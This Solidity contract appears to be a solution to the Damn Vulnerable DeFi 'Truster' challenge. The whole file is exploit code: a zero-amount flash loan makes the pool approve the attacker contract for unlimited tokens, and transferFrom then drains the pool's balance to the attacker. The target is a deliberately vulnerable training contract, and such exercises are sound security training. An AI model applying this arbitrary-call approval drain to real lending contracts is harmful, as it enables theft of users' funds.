// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../../src/Contracts/truster/TrusterLenderPool.sol";

contract Exploit {
    TrusterLenderPool internal immutable pool;
    address internal attacker;
    DamnValuableToken public immutable token;

    constructor(address _pool, address _attacker, address _token) {
        pool = TrusterLenderPool(_pool);
        attacker = _attacker;
        token = DamnValuableToken(_token);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(
            address(pool),
            address(attacker),
            token.balanceOf(address(pool))
        );
    }
}
